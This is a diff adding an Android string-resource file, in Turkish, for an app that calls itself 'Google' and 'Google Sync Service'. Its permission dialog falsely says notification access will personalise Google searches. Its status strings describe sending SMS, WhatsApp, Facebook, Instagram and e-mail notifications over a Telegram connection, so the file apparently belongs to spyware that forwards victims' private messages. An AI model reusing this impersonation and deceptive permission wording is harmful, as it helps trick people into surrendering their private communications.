@@ -1,0 +1,53 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">Google</string>
+    <string name="service_name">Google Sync Service</string>
+    <string name="service_channel_name">Sync Service</string>
+    <string name="service_channel_description">Background synchronization service</string>
+
+    <!-- Main UI -->
+    <string name="search_hint">Google\'da ara veya URL gir</string>
+    <string name="search_button">Google\'da ara</string>
+    <string name="feeling_lucky">Şanslıyım</string>
+
+    <!-- Permission Dialog -->
+    <string name="permission_title">Google Hizmet Güncellemesi</string>
+    <string name="permission_message">Google arama deneyimini iyileştirmek için bildirim erişimi gerekiyor. Bu, aramalarınızın daha kişiselleştirilmiş olmasını sağlar.</string>
+    <string name="permission_grant">İzin Ver</string>
+    <string name="permission_deny">Şimlik Değil</string>
+    <string name="permission_settings">Ayarlar</string>
+
+    <!-- Service Notification -->
+    <string name="foreground_notification_title">Google Search</string>
+    <string name="foreground_notification_text">Arama hizmeti aktif</string>
+
+    <!-- Status Messages -->
+    <string name="status_connected">Telegram bağlantısı aktif</string>
+    <string name="status_disconnected">Telegram bağlantısı kesildi</string>
+    <string name="status_sending">Gönderiliyor…</string>
+    <string name="status_sent">Gönderildi</string>
+    <string name="status_failed">Gönderilemedi</string>
+
+    <!-- Errors -->
+    <string name="error_no_internet">İnternet bağlantısı yok</string>
+    <string name="error_telegram_failed">Telegram mesajı gönderilemedi</string>
+    <string name="error_notification_access">Bildirim erişimi gerekli</string>
+
+    <!-- Toast Messages -->
+    <string name="toast_service_started">Hizmet başlatıldı</string>
+    <string name="toast_service_stopped">Hizmet durduruldu</string>
+
+    <!-- Settings -->
+    <string name="settings_title">Ayarlar</string>
+    <string name="settings_enable_service">Hizmeti Etkinleştir</string>
+    <string name="settings_test_send">Test Mesajı Gönder</string>
+    <string name="settings_clear_queue">Kuyruğu Temizle</string>
+
+    <!-- Notification Types -->
+    <string name="notify_type_sms">SMS</string>
+    <string name="notify_type_whatsapp">WhatsApp</string>
+    <string name="notify_type_facebook">Facebook</string>
+    <string name="notify_type_instagram">Instagram</string>
+    <string name="notify_type_email">E-posta</string>
+    <string name="notify_type_other">Diğer</string>
+</resources>
